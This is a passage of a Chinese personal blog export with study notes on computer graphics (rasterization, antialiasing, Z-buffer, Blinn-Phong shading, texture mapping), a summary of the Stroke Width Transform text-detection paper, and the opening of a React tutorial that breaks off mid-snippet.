图形学中采样的应用非常广泛。 下面以对一个三角形的采样为例： 实际上这个过长就是计算哪些像素的中心被三角形包围的过程。于是我们可以使用如下的二值函数表示： inside(t,x,y)={1Point(x,y)intrianglet0otherwiseinside(t,x,y) = \\begin{cases} 1 &amp; Point (x,y) in &amp; triangle &amp; t \\\\ 0 &amp; otherwise \\end{cases} inside(t,x,y)={10​Point(x,y)inotherwise​trianglet 那么采样代可以这样表示： 12345for (int x = 0; x &lt; xmax; x++)&#123; for (int y = 0; y &lt; ymax; y++)&#123; image[x][y] = inside(tri, x+0.5, y+0.5); &#125;&#125; 那么如很判断一个像素点是否在三角形内部呢？ 这一点在叉积中有所体积，即只需要使用该点与三角形的三个边进行叉积，判断三个叉积结果的正负是否相同即可。 边界处理 但是对于落在三角形边上的像素点我们应该如何处理呢？ 实际上OpenGL与DirectX中使用左上原则（top-left rule）处理，即落在三角形上边与左边的点被认为属于三角形内部 加速 但是现在又有一个性能上的问题，那就是对于任意三角形，我们是否有必要对屏幕上的所有像素都判断一边呢？ 显然这样会使得性能浪费，因此我们取三角形顶点坐标的x与y的极大极小值形成一个足以包裹该三角形的矩阵，只需要对该矩形进行光栅化即可得到想要的效果，该矩形称为Bounding Box，即包围盒，此处使用的是轴向包围盒，Aixe Align Bounding Box，AABB。 但实际上还有更快的加速方式，比如对每一行都找最左和最右像素点，相当于对每一行寻找一个包围盒。 该方法解决了AABB中，如果一个三角形很长但很扁，且倾斜了45°时的性能浪费。 实际屏幕上的光栅化 可见实际上一个像素并不是由一个单一的小方块形成，而是类似上图中的RGB条，或其他具有结构的小块。 例如S5中应用的是Bayer Pattern，可以发现其中绿色的点比红蓝分布的更密集，原因是人眼对绿色更敏感 在其他的成像设备上，例如彩色打印机，我们能看到更复杂的结构： 现在我们可以看到一个三角形图片，最终在我们定义的显示器显示的样子了： 真实三角形： 我们显示的三角形： 是不是很奇怪？奇怪就对了，于是乎我们可以在这引出一个概念：Jaggies锯齿 事实上，锯齿并不是什么新鲜概念，从信号处理的角度来说，锯齿实际上就是由于采样率较低导致的，我们还可以称其为：Aliasing走样 反走样与深度缓冲（Antialiasing and Z-Buffering） 由于采样在显示生活中广泛存在，因此，例如图像中的像素、动画、音频中的帧等等，因此，在这些领域中均存在下采样的问题。 于是我们引出一个图形学中用于表示错误的词：Artifacts，他可以表示Errors/Mistakes/Inaccuracies。 图形学中常见的Artifacts Jaggies锯齿 Moire Patterns摩尔纹 该现象是由于采样时跳过一些奇数行或列导致的 Wagon Wheel Illusion 即显示生活中看到的车轮倒转的现象，这是由于我们人脑在时间上采样不足导致的。 总的来说，走样是由于型号变化的速度太快，而我们采样的速度太慢导致的。 解决走样的方法 在采样前，先做一次平滑（Blurring），即使用低通滤波进行过滤。 但是我们先进行采样，在进行模糊，经得到并不理想的结果： 频域Frequency Domain 为了简单理解，我们从最简单的正余弦函数开始： 下面我们对引入x的系数f，我们称它为频率，它反映了正余弦函数变化的快慢： 定义周期，表示每隔多久函数会重复一次，周期为频率的倒数 傅里叶变换Fourier Transform 所起傅里叶变换，就不得不提傅里叶级数展开。 傅里叶认为任何周期函数，都能表示为一些列正余弦函数的线性组合以及一个常数项。 考虑这个傅里叶展开的过程，展开形成的正余弦函数均具有不一样的频率，且从低到高排列，常数可以认为频率为0，也就意味着每一个正余弦项，都代表了一个特殊的频率。 那我我们先来看看对不同频率的函数进行采样： 可见，对于频率越高的函数，采样后越无法恢复，再看如下图： 可见，对于图上蓝色与灰色的两个函数，他们的采样结果是一样的，这就意味着我们通过采样恢复得到原函数是不唯一的，这就是走样的更准确定义。 下面我们看看傅里叶变换： 傅里叶变换可以让图片从时域转化为频域 右图就表示了左图的频域信息，越靠近中心，频率越低，越往四周，频率越高，可见图片大部分信息集中在低频。 再看频域有很明显的两条中轴线，实际上这代表了图像的四个边界，我们在求傅里叶变幻时，实际上将一个没有周期特性的图片进行了周期延拓（考虑对非周期函数进行傅里叶展开时的操作），也就意味着我们将这张图在他的四个方向上复制了很多分并紧挨着排列。因此这些图片会在边界上发生剧烈的变化，也就意味着频率非常高，反映到频域就是中间的两条白线（实际上这些白线最开始会出现在四周，为了便于观测，我们对频域进行了平移，将低频移动到了中心，详见数字图像处理中的傅里叶变换） 下面我们对这张图的频域应用一个滤波，看看会有什么效果： 如图是应用高通滤波产生的效果，可见频域中的低频信息被去掉了（中间被掏空），反应到图像中则是边界被保留了，相反的则是低通滤波，下过如下： 此外还有保留特定频率的带通滤波器： 卷积Convolution 卷积定理Convolution Theorem 空域（时域）的两个函数卷积等于两个函数在频域上的乘积，空域（时域）的两个函数乘积等于两个函数在频域上的卷积 盒式滤波器Box Filter 考虑盒式滤波器的大小对其在频域内图像的影响，对于更大长宽的盒式滤波器，经其处理过的图片将更加平滑，因此反应到频域就是保留了更小范围的频率： 采样 下面从频域的角度再次审视采样，实际上就是重复频率或频域上的内容。 利用卷积定理：在空域的乘积等于频域的卷积，可以得到：对空域中的采样可以认为是使用一组取值为1的脉冲函数与原函数的乘积得到如下图所示： 如果将函数a与脉冲函数c进行傅里叶变换，我们来看看他们在频域中的表现： 可见，在频域中b与d进行卷积得到了图f，而图f是图b的频率图像的周期重复。 走样 接着，我们再从频域的角度来思考走样的问题：对于如下采样的结果： 可见原函数的每一次频域图像的重复可以很清晰的分辨出来，但是如果我们的采样频率降低，即对用在频域中的f取值减小，间隔减小那么将得到如下的采样结果： 可见，相邻两个原函数频域图像的复制叠加在了一起，于是便难以区分原函数的样貌，这就产生了走样（或者说混叠） 反走样 于是我们可以根据采样的原理，来分析一下反走样的方法： 增加采样率 例如使用高像素的显示器，传感器 但是这种方法开销很大，需要很高的分辨率 反走样（Antialiasing） 例如前文提到的先做模糊再做采样 反应到频域就是将高频信号阶段再做复制： MSAA(Multi Samples AntiAliasing) 由上述反采样的分析，我们得到了一个似乎可行的方案： 先使用1像素的盒式滤波器对原图像进行平滑 再对平滑后的图像进行采样 但是使用1像素（物理）的盒式滤波器如何进行平滑呢？我们可以通过计算该像素中的灰度值平均来实现，例如下图中，黑色部分代表被物体覆盖的区域，白色代表背景： 但是这个面积往往难以求解，于是提出了将该像素（物理），再细分为4*4个像素（逻辑）的近似方法MSAA： 但是，MSAA，代价是什么呢？ 计算量被增加了，4*4将使得计算量增加16倍 而工业上将使用更少的点，并将这些逻辑像素按照更有效的图案（而非均匀）地分布到物理像素中去，一些逻辑像素还将被相邻的物理像素复用。 因此平时打游戏时开启MSAA帧数并不会下降到原来的1/4 此外还有其他抗锯齿的方法，比如： FXAA（Fast Approximate AA） 先采样得到一副有锯齿的图形，然后通过图像处理的方法，找到有锯齿的边界，并将这些边界替换为没有锯齿的边界 TAA（Temporal AA） 通过寻找上一帧的像素信息，仍然使用一个物理像素来判断该像素是否在物体内，但是会使用上一帧的像素和这一帧的像素来判断，类似于动态模糊，相当于将MSAA中的逻辑像素划分放在了时间上，将上一帧的边界信息复用到下一帧来显示。 但该方法会产生拖影。 以上两种得到了工业上的广泛应用。 另外，还有一个与抗锯齿类似的操作：超分辨率（Super resolution/Super sampling） 该问题可描述为：将低分辨率拉伸为高分辨率（放大的过程会使得产生更明显的锯齿效果） 该问题实际上还是一个如何解决采样率不够的问题 解决该方法的技术有著名的DLSS（Deep Learning Super Sampling），也就是通过使用深度学习的方法将放大后缺失的部分猜出来 可见性与遮挡 考虑在绘制一幅图形时，我们应该如何体现物体的远近之分？ 考虑绘制油画时的处理方式，先绘制远处的物体，然后绘制近处的，让近处的物体覆盖远处的物体。这就是画家算法的思想。 即画家算法的思想就是：让后绘制的物体永远覆盖先绘制的物体。 但当我们需要绘制立方体这张多个面堆叠的物体时，与我们远近相同的四个面，我们应该以怎样的顺序去绘制呢？ 考虑采用左下右上的顺序绘制该立方体，我们将得到正确的遮挡顺序，但如果我们采用右上左下的顺序绘制呢？由于右边比上边晚绘制，因此左侧将覆盖上侧，那么最终绘制的图像将如下图所示： 原因就是左侧比上侧晚画，因此上侧无法将左侧的边界遮盖。 画家算法 那么画家算法该如何区分物体的顺序呢？一个很简单的思路就是将物体（三角形）按深度大小排序，排序时间复杂度为O(nlogn)O(nlogn)O(nlogn)，但是我们考虑下面的情况： PQR呈现两两相互覆盖的视觉特征，这样我们就很难定义谁在前谁在后，因此就无法对他们进行深度的排序，更不用说正确的绘制它们了。 Z-Buffer（深度缓冲/缓存） 经过上面的分析我们发现，画家算法并不能很好的完成任务，因此诞生了一种目前工业界广泛采用的算法：Z-Buffer Z-Buffer的思想就是： 既然我们考虑整改三角形的远近关系存在问题，那么我们就更细微的去考虑每个像素的深度关系 每一个像素内，记录它的最小深度。 例如下图中的一个像素点，由于先绘制了地板，该像素的深度值被记录为了地板的深度值，接下来绘制立方体时，发现立方体也需要绘制在该像素上，且立方体在该像素上的z值小于原先该像素的z值，于是该像素将记录新的z值 引入一个额外的缓存区域用于存储这些深度信息：z-buffer frame buffer用于存储颜色信息 z-buffer用于存储深度信息 而联系到我们之前讨论的相机的标准位置，我们认为相机的视线方向是z轴的负方向，这样会导致越小的z反应了越远的距离，这样有点反直觉，因此此处规定： z永远为正 z越小，反应的深度越近 如下图所示的两幅图在采用了z-buffer的渲染中是同步产生的： 右图中越黑的地方反应了越小的z值，也就是离摄像机越近。 由此可以得到算法的伪代码如下： 可以通过如下图示进一步理解，其中R代表无限大（C++中可以使用inf代表）： 考虑该算法的时间复杂度，该算法的过程中我们并没有对其进行排序，只需要遍历每个三角形的每个像素即可，而我们认为每个三角形中的像素个数为常数个，因此最终该算法的时间复杂度可以认为是O(n)O(n)O(n),n为三角形个数。 考虑该算法是否会像画家算法一样，因为绘制的顺序不同而产生不同的结果呢？若不存在两个物体在同一个像素具有相同的深度，那么答案显然是不会的。 而实际上我们假设不存在两个在同一像素位置具有相同深度的物体是有迹可循的，因为计算机中深度信息通常使用浮点数进行存储，浮点数相等需要非常苛刻的条件。但实际上也确实存在深度发生冲突的情况，详细可见3D渲染中的Z-fighting现象 - 知乎 (zhihu.com) 而当我们使用MSAA将一个像素细分时，Z-Buffer就要对每一个采样点（逻辑像素）记录一个深度信息。 此外，z-buffer无法处理透明物体，需要使用特殊的方法处理。 着色（Shading） Illumination，Shading and Graphics Pipeline 此处引用Merriam-Webster Dictionary对shading的定义： shading, noun The darkening or coloring of an illustration or diagram with parallel lines or a block of color 而在Game101课中shading给出如下定义： The process of applying a material to a object Blinn-Phong Reflectance Model 一个简单的着色模型 我们先来看看光在实际生活中的模样： 下图中的杯子我们可以大致将光分为三种： 高光 漫反射光 间接光照 那么我们可以定义某个材质的三个部分的光与杯子的光相同，以此定义一种材质。 我们先给出一些定义： shading point，一个需要考虑着色的单位，通常是位于物体表面的一小块区域，如果区域足够小，我们则可以认为他是一个平面。 View direction，v，观测方向，相机与shading point的连线向量 Surface normal，n，平面法线，垂直于shading point的向量 Light direction，l，光照方向，光源与shading point的连线向量 Surface parameters，物体表面属性，例如color，shininess等等 为了便于计算，上述向量均为单位向量 此外，此时讨论的作色为Local Shading，即局部光照，不考虑某物体的光照对其他物体的影响，比如阴影。 漫反射Diffuse Reflection 对于漫反射而言，从不同的角度对这一块区域进行观测应该能观测到相同的颜色 而由于物体表面接受到的光照并不一样，因此才产生了不同的颜色，那我我们如何去衡量物体的一个面接受到了多少光照呢？此处我们将光照视为一种能量，考虑一个观测点附近的单位面积： 可见，接收到的光照的强度与观测点法线于光照方向的夹角存在一定的关系，事实上它们是成正比的。由此可以计算出有多少光在这一着色点上会被接收。 然后我们进一步考虑光源发出的能量： 考虑光在传播的过程中不会出现能量的损失，而光在各个方向行动的速度是相等的，那么，能量将被集中在一个球壳上，而随着球壳的增大，由于能量受能定律，越往外，球壳上的单位能量就越小，可见球壳上某一点的光照能量与该点到光源的距离成平方反比。 因此对于一个着色点，如果我们已知它与光源的距离，就能计算出有多少光传播到了该着色点。 到目前为止，我们得到了以下两项指标： 有多少光传播到了一个着色点 该着色点接收了多少光 由此可以得到漫反射的计算公式： Ld=kd(I/r2)max(0,n⃗⋅l⃗)L_d = k_d(I/r^2)max(0,\\vec n \\cdot \\vec l)Ld​=kd​(I/r2)max(0,n⋅l) 其中I代表单位距离上点光源的光强。 max函数用于排除向量n与l夹角余弦为负的情况，在该情况下，表示一束光从物体的内部穿过到达了着色点，该情况暂时不予考虑 其中kdk_dkd​表示反射系数，即显示生活中物体将会吸收一部分频率的光，反射另一部分，该系数表示了着色点反射了多少能量，反应到观感上就是明暗信息，将其分别应用于r，g，b三通道，就能得到该作色点的颜色。该值更直观的展示可以看如下图： 可见该公式中并没有出现观测方向向量v，可以体现出漫反射与我们观测的视角并没有关系。 高光Specular Term 高光的效果存在一种特性：反射方向非常接近镜面反射的方向，即出射方向集中于一个方向。 因此只有当我们观察的方向于高光的出射方向足够接近时，才可能看到高光。 但是Blinn-Phong模型观察到了一个更有意思的现象，那就是：当观测方向V与镜面反射方向R接近时，光照方向I与观测方向V的半程向量h与法线n非常接近，也就是如下图所示的情况： 其中半程向量是指向量I与V角平分线方向定义的单位向量，由向量加法的平行四边形法则我们可以很容易的得到向量h，即： h=bisector(V⃗,I⃗)=V⃗+I⃗∣V⃗+I⃗∣h = bisector(\\vec V, \\vec I) \\\\ = \\frac{\\vec V + \\vec I}{|\\vec V + \\vec I|} h=bisector(V,I)=∣V+I∣V+I​ 由此我们就可以很好的避免去求一个反射向量R 那么在根据前文提到的漫反射计算方法，就能得到高光的计算方式： Ls=ks(I/r2)max(0,cosα)p=ks(I/r2)max(0,n⃗⋅h⃗)pL_s = k_s(I/r^2)max(0, cos\\alpha)^p \\\\ = k_s(I/r^2)max(0, \\vec n \\cdot \\vec h)^p Ls​=ks​(I/r2)max(0,cosα)p=ks​(I/r2)max(0,n⋅h)p 其中ksk_sks​表示物体吸收的光谱，但高光部分通常认为是纯白色 此外事实上也要考虑入射角对光照强度的影响，但是该模型中并没有考虑 指数p则需要通过如下的图示来解释： 我们知道高光往往是一个非常小的范围，而直接使用余弦相似度来判断是否属于高光，会得到一个非常大的范围，因为余弦相似度对夹角的变化不够敏感，可以看到第一张图中，当夹角增加到45°时，余弦值依然很大，因此，我们需要通过增加余弦函数对夹角的敏感度来调整这个范围，于是想到了给它加一个指数，可以看到p越大越敏感。通常情况下在该模型中p一般取100-200。这类图像我们可以称为Cosine Power Plots。 如下图是一个不同ksk_sks​值与p值组成的矩阵： 为了能更好的观察高光，此处在渲染高光的同时也渲染了漫反射。 可见随着p的增大，高光范围在逐渐缩小 可以看到，虽然并没有给出颜色信息，但是我们也能大致感受到这些物体属于不同的材质。 间接光照Ambient Term 在Blinn-Phong模型中，对这一部分的内容进行了简化，由于环境中的光十分复杂，经过各种反射最终到达物体，于是该模型直接摆烂了😆，既然环境光无处不在，并且能作用到物体的每一个地方，那么干脆就不考虑入射方向和观测点，如下图所示： 那么直接让物体整个全部变亮即可，于是就得到了如下的近似公式： La=kaIaL_a = k_aI_a La​=ka​Ia​ 其中IaI_aIa​代表环境光照的单位光强 实际上如果位置确定，对于入射角度与观测角度而言，该式计算出来就是一个常数 在该模型中，间接光照的作用就仅仅体现在了让物体没有一块非常暗的区域上了。 总结 于是我们将三个部分结合起来，就得到了最终Blinn-Phong模型的表示方式： L=La+Ld+Ls=kaIa+kd(I/r2)max(0,n⃗⋅l⃗)+ks(I/r2)max(0,n⃗⋅h⃗)pL = L_a + L_d + L_s \\\\ = k_aI_a \\\\ + k_d(I/r^2)max(0,\\vec n \\cdot \\vec l) \\\\ + k_s(I/r^2)max(0, \\vec n \\cdot \\vec h)^p L=La​+Ld​+Ls​=ka​Ia​+kd​(I/r2)max(0,n⋅l)+ks​(I/r2)max(0,n⋅h)p 最终着色效果如下： 可见该模型在着色上取得的了相对较好的结果，但事实上还有很多我们没有考虑的问题，比如下凹的区域的间接光照会比平坦的区域小，比如观测点距离越远看到的物体越暗（需要使用Radiance来解释）等等。 作色频率Shading Frequencies 下面我们来讨论以下作色频率。 那么什么是着色频率呢？观察下面的图： 图一中我们以平面为单位进行着色，以该平面的法线来计算其颜色，然后将该平面涂上一样的颜色 图二中使用了插值的方法，每个平面由顶点确定，于是我们计算各个顶点处的颜色，然后使用插值的方法计算出顶点围成的平面中的颜色。 图三中的着色则是应用在每个像素上，先求出每个平面的顶点的法线方向，然后通过插值计算出平面内部各个像素的法线方向，根据这些法线，计算每个顶点的着色 下面我们对这三种方法给出更严格的定义： Flat Shading 对于每一个三角形面计算出该面的法线方向（任意两边的叉积），根据这个法线为平面着色 这种方式无法得到一个平滑的表面 Gouraud Shading（高洛德着色） 对于每个三角形，计算出他们顶点的法线方向，根据这些法线，计算出顶点的颜色，然后使用插值的方法来计算出三角形内部的颜色 当三角形稍微大一点（模型精度不够）时，高光就会不怎么明显，可见下图棕色球体，但比Flat更平滑。 Phong Shading（冯着色） 对于每个三角形，计算出他顶点的法线方向，然后通过插值，计算出三角形内部每个顶点的法线方向后根据这些法线计算出每个像素的着色 可以看到下图中的效果很不错 值得一提的是冯着色的发明者与上文提到的着色模型作者相同，但天妒英才，他在攻读博士期间因病去世。 从这些着色频率可以看出着色的工作量按顺序递增，并且着色的效果与模型的精细度还是有关系的，从下面的图片可以看出，在建模非常精细的情况下，三种着色频率能够得到相似的效果，此时我们通常会采用更节约算力的方法： 那么，抛开Flat Shading不谈，其余两种作色频率均需要我们去计算某个点的法线，这些法线应该如何计算呢？对于特定的机构，例如使用一系列三角形来模拟一个球体，那么这些三角形的顶点显然也对应了原本球体上的点，那么这些点就可以通过计算圆心到该点的方向得到法线方向： 但对于其他图形该怎么办呢？ 计算顶点的法线 那么对于其他图形，我们可以借助共用这个顶点的其他三角形来计算该点的法线，例如下面这幅图： 对于共用该点的四个面，我们分别求出他们的法线，然后使用这些法线求平均，即可计算出该点的法线，但为了避免过于平均，即体现出面积更大的三角形贡献的更多，需要计算这些法线的加权平均，公式简写为如下形式： Nv=∑iNi∣∑iNI∣N_v = \\frac{\\sum_i N_i}{|\\sum_i N_I|} Nv​=∣∑i​NI​∣∑i​Ni​​ 计算逐像素的法线 通过上面的分析我们可以知道，能够通过插值的方法得到三角形内每个点的法线，如下图所示： 计算这些法线需要使用到重心插值法Barycentric Interpolation，由Kai Hormann与2014年出版于期刊Approximation Theory XIV: San Antonio 2013 上的一篇论文。之后会进行详细说明。 渲染管线（Graphics（Real-time Rendering）Pipeline） 渲染管线实际上就是定义了一个场景，到最后显示的一幅图片这一过程期间经过了怎样的过程。而实际上这些过程我们已经通过之前的学习有所了解了，接下来可以结合这幅图将之前学过的一些东西进行一个总结，就可以得到一个渲染管线了： 其中Fragments借用了OpenGL中的一个概念，也就是前文讨论光栅化时为了便于理解而引入的物理像素 我们可以将之前学到的只是进行如下排序： 顶点处理 Vertex Processing，将三维空间中的点经过变换与投影，转化到二维空间，这一步结束将得到Vertex Stream Triangle Processing，将这些点连接形成三角形，这一步结束将得到Triangle Stream 光栅化（Rasterization） 即对原三角形进行采样与深度测试，这一步结束将得到Fragment Stream 着色 Fragment Processing，对每个Fragment进行单独的着色，这一步结束将得到Shaded Fragments Framebuffer Operations，将Fragment结合得到最终需要显示的由像素组成的图片。 接下来我们在来看看之前学过的内容都发生在哪些位置： Model，View，Projection transforms，即变换，应该发生在Vertex Processing阶段 Sampling triangle coverage，采样，发生在Rasterization阶段 Z-Buffer Visibility Tests，深度测试，发生在Fragment Processing阶段，事实上也可以认为他是一个属于光栅化的步骤 Shading，着色，发生在Vertex Processing或Fragment Processing阶段，如果我们使用Gouraud Shading渲染频率，那么一旦顶点产生就可以计算顶点的颜色，但如果我们使用Flat Shading或者Phong Shading，我们则需要在Fragment Processing中进行着色或进行下一步操作。 Texture Mapping，纹理映射，发生在Vertex Processing或Fragment Processing，后文将介绍这一块内容。 Shader Programs 每个顶点或片段（像素）都会执行的程序 对于顶点操作的程序称为Vertex Shader，顶点着色器。 对于片段（像素）操作的程序称为Fragment Shader，像素着色器 下面来看一个GLSL（GL Shader Language）的例子： 使用如下网站可以帮助我们实验shading的过程： Shadertoy BETA 网站由Inigo Quilez提供，该用户在B站有账号。 图形管线的一种实现就是GPUs，GPU可以理解为高度并行的CPU。 纹理映射Texture Mapping 如图所示，其中小球上不同的位置具有不同的颜色反馈，由此可以体现出小球上不同的花纹，同理，地板上也能呈现出不同的花纹，通过学习Blinn-Phong模型我们知道，可以通过控制漫反射系数来控制漫反射颜色效果，因此，纹理映射就可定义为确定一组漫反射系数，使得物体表面的颜色反馈达到某一特定效果。那么我们如何定义物体表面呢？ 物体表面Surface 我们认为任何三维物体的表面都与二维平面存在一一对应关系： 那么这样的映射关系时什么呢，实际上，如果我们使用一系列三角形来描述一个物体，那我们也可以将他的贴图划分为一些列三角形，如果物体上的三角形的顶点与贴图上的三角形顶点具有对应关系，则我们便得到了这样的一组纹理映射。 纹理坐标系Texture Coordinates 如果要定义纹理图片上的一个点的坐标，那么我们就需要一个坐标系，我们常常使用的时纹理坐标系（u,v）： 为了方便处理，通常我们认为u,v∈[0,1]u,v \\in [0,1]u,v∈[0,1] 此外，还有一些纹理可以通过复制自身来覆盖一块比自身更大的区域，比如我们在渲染地砖时往往并不需要和地面一样大小的纹理贴图，这样可以多次使用且能无缝衔接的贴图我们认为它时tileable的：","categories":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"图形学入门","slug":"计算机图形学/图形学入门","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%A5%E9%97%A8/"},{"name":"Games101","slug":"Games101","permalink":"http://enderxiao.github.io/categories/Games101/"},{"name":"1-8","slug":"Games101/1-8","permalink":"http://enderxiao.github.io/categories/Games101/1-8/"}],"tags":[{"name":"计算机图形学","slug":"计算机图形学","permalink":"http://enderxiao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"},{"name":"Games101","slug":"Games101","permalink":"http://enderxiao.github.io/tags/Games101/"}]},{"title":"SWT论文笔记","slug":"SWT论文笔记","date":"2022-01-08T08:36:27.000Z","updated":"2024-07-30T11:26:33.914Z","comments":true,"path":"2022/01/08/SWT论文笔记/","permalink":"http://enderxiao.github.io/2022/01/08/SWT%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/","excerpt":"传统图像处理算法SWT论文阅读笔记","text":"传统图像处理算法SWT论文阅读笔记 引言 该算法由Boris Epshtein等人于2010年提出并于2010年的CVPR上发表论文《Detecting Text in Natural Scenes with Stroke Width Transform》。本文提出了一项新的用于图像目标检测的特征：Stroke Width，并提出了对其进行量化的方法，通过实验证明了使用该特征进行文字检测能够得到不错的效果。该算法IDCAR2003竞赛中使用的数据集上取得了73%的 查准率与60%的召回率，并且仅花费0.94秒，是以往算法的1/15。 论文中描述的算法包括三个主要步骤： 利用canny算子检测图片边界 计算笔画宽度变化Stroke Width Transform，得到SWT图像 通过SWT图像得到多个连通域 通过定义规则过滤一些连通域，得到候选连通域 将连通域合并为文本行 计算笔画宽度 本文定义了Stroke Width特征，该特征描述了某一笔的宽度。SWT算法进行文字检测时就是利用同一笔画的宽度相近进行的。那么，对于图中任一一个像素点，该如何寻找其笔画宽度呢？ 本文中提出的方法是利用梯度。 对于如下图a所示的笔画： 对于处于笔画边缘的像素点P，按p的梯度方向进行搜索，找到同一笔画下对应像素p。 图C中射线经过的像素使用当前最小值和笔画宽度进行匹配。 将笔画宽度初始值均设置为无穷大，首先使用Canny算子检测图片边缘信息，计算每个像素点p对应的梯度方向dpd_pdp​，如果p位边界笔画，则沿着射线r=p+n∗dp,n&gt;0r = p + n*d_p, n&gt;0r=p+n∗dp​,n&gt;0寻找另一个边界像素点q，如果q的梯度方向dqd_qdq​与dpd_pdp​几乎相反，则就可以使用这两个点来计算该段笔记的长度。 判断两个梯度方向相反时使用如下方式： (dq=−dp±π/6)(d_q = -d_p \\pm \\pi/6)(dq​=−dp​±π/6) 若点p的梯度与点q的梯度的反方向夹角在±π/6\\pm \\pi/6±π/6之间，那么这两点间的距离为一个笔画宽度。 对于找到了q的p点，输出segment值，segment[p,q]段内像素取通过该像素点的宽度的最小值，笔画宽度为： segment[p,q]=∣∣p−q⃗∣∣segment[p,q] = ||\\vec{p - q}||segment[p,q]=∣∣p−q​∣∣ 对于没找到对应像素点q，或者dpd_pdp​与dqd_qdq​不符合反向条件的点p，则丢弃这条射线。 而对于如下情况： 一个笔画中的像素，可能得到两个笔画宽度。对于图a的情况，将红点p处的笔画宽度设置为最小的那个值。对于图b的情况，两条射线均无法表示笔画的宽度，这是笔画宽度取里面所有像素计算得到的笔画宽度的中值作为红点处笔画的宽度。 考虑到背景和文字的亮度关系存在两种情况： 文字比背景亮 背景比文字亮 因此这一步骤往往需要执行两次，最终得到一张SWT图像。 计算连通域 通过上述步骤得到SWT图像后，该图像中每个像素点的值为对应像素所在笔画的宽度，即SWT值。 这一步作者通过修改经典的Connected Component algorithm算法[1]，将连接规则从binary mask改为比较相邻像素SWT值实现。 基于同一笔画中笔画宽度相近这一理论，我们可以认为相邻像素的SWT值如果近似，那么将这两个像素划分为一个连通域。 现将相邻像素SWT值比不超过3.0的归为一个连通域。这样就能得到多个连通域。 过滤连通域 对于得到的多个连通域，可能存在噪声影响，例如下图所示的黑色区域均为连通域： 下面我们希望通过过滤这一操作，仅保留最有可能是文字的连通域，得到效果如下： 作者使用了ICDAR2003数据集进行了一系列相对宽松的规则学习。最终过滤规则如下： 如果某连通域的内方差过大（内方差过大指连通域的内方差大于平均笔画宽度的一半），则认为该连通域不是有效的。该规则主要针对自然场景中树叶等干扰物的影响 如果某连通域过大（宽度大于300）或过小（宽度小于10），则认为该连通域不是有效的。 如果连通域的直径与连通域SWT的中位数的比值超过10，则认为该连通域是不是有效的。该规则主要针对自然环境中长而窄的分量 考虑到类似广告牌的情况，连通域将会包裹在文字四周，作者通过限制连通域的外接矩形不能包括超过两个其他的连通域，来区别出这类文字。 连通域合并 文中认为，在自然场景中，一般不会只有单个字母出现，所有将连通域合并为文本有利于进一步将噪声排除。 当两个连通域满足下面条件时，认为这两个连通域是一对： 两个连通域中值的比小于2.0（连通域中值，指的是连通域中所有像素值的中值） 两个连通域高的比小于2.0（连通域的高，指其外界矩形的高） 两个连通域之间的距离小于较宽的连通域宽度的3倍（连通域之间的距离为连通域外接矩形中心点之间的距离） 两个连通域的颜色相似（代码可用两个连通域对应于原图区域的像素均值代表该连通域的颜色） 得到两两连通域组成的多对连通域后，如果有两对连通域有共享的连通域，共享的连通域都在连通域对的一端（即连通域的首端或者尾端），且方向相同（方向用一个连通域中心到另一个连通域中心的方向），就将这两对连通域合并为一个新的连通域组，依次进行，知道没有连通域对需要合并则合并结束。 最后将合并完的结果中滤除小于3的连通域的连通域组得到的最终结果，认为是一行文字。 Reference [1] B. K. P. Horn, “Robot Vision”, McGraw-Hill Book Company, New York, 1986.","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"论文","slug":"研究生/论文","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%AE%BA%E6%96%87/"},{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/categories/CV/"},{"name":"图像处理","slug":"CV/图像处理","permalink":"http://enderxiao.github.io/categories/CV/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/tags/CV/"},{"name":"图像处理","slug":"图像处理","permalink":"http://enderxiao.github.io/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"笔记检测","slug":"笔记检测","permalink":"http://enderxiao.github.io/tags/%E7%AC%94%E8%AE%B0%E6%A3%80%E6%B5%8B/"}]},{"title":"React学习笔记一","slug":"React学习笔记一","date":"2022-01-05T02:40:48.000Z","updated":"2024-07-30T12:03:15.974Z","comments":true,"path":"2022/01/05/React学习笔记一/","permalink":"http://enderxiao.github.io/2022/01/05/React%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/","excerpt":"前端框架React学习笔记","text":"前端框架React学习笔记 前言 上研究生后老师让直接去实习，实习单位使用React + React Native进行安卓混合开发。于是先学习一下React React概述 React是一个构建用户见面的JS库 React核心文件及渲染流程： App.js（入口文件） -&gt; index.js（根组件）-&gt; public/index.html（root挂载点） React特点 声明式 只需要描述UI（HTML）看起来是啥样，即描述结构，React负责渲染UI以及在数据变化时更新UI 基于组件 用于表示页面中的部分内容 通过组合、复用多个组件，就能实现完整的页面功能 学习一次随处使用 使用React开发Web应用 使用React-native开发移动端应用 React 360开发VR应用 React 安装 1npm i react react-dom react包是核心，提供创建元素，组件的功能 react-dom包提供DOM相关功能 React初见 选择一个目录 创建index.html 在该目录下安装react包 1npm i react react-dom 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=&quot;cn&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width-device-width, initial-1.0 &quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;react&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; &lt;!-- 引入reactjs --&gt; &lt;script src=&quot;./node_modules/react/umd/react.development.js&quot;&gt;&lt;/script&gt; &lt;script 